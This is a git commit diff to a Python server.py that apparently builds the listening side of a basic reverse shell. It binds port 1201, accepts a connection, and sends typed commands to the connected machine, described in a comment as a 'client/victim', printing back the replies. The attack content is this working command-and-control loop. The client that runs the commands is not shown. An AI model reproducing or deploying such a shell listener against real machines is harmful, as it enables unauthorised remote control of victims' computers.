920467e42635e0598410f2638caa67f1f773fdc7
Joy Debnath <joy91740@gmail.com>
2021-09-17 00:12:57 +0600

    Send commands to client/victim or a friend

--- server.py
+++ server.py
@@ -2,17 +2,19 @@ import socket
 import sys
 
 
-#Create a Socket (connect two computer)
+# Create a Socket ( connect two computers)
 def create_socket():
     try:
         global host
         global port
         global s
         host = ""
-        port = 9090
+        port = 1201
         s = socket.socket()
+
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
+
 
 # Binding the socket and listening for connections
 def bind_socket():
@@ -20,20 +22,42 @@ def bind_socket():
         global host
         global port
         global s
+        print("Binding the Port: " + str(port))
 
-        print("Binding the Port" + str(port))
-
-        s.bind((host,port))
+        s.bind((host, port))
         s.listen(5)
 
     except socket.error as msg:
-        print("Socket Binding error" + str(msg) + "\n" + "Retrying.....")
+        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
         bind_socket()
+
 
 # Establish connection with a client (socket must be listening)
 
 def socket_accept():
-    conn,address = s.accept()
-    print("Connection has been established!" + "IP" + address[0] + " | Port" + str(address[1]))
-    send_command(conn)
-    con.close()
+    conn, address = s.accept()
+    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+# Send commands to client/victim or a friend
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024),"utf-8")
+            print(client_response, end="")
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
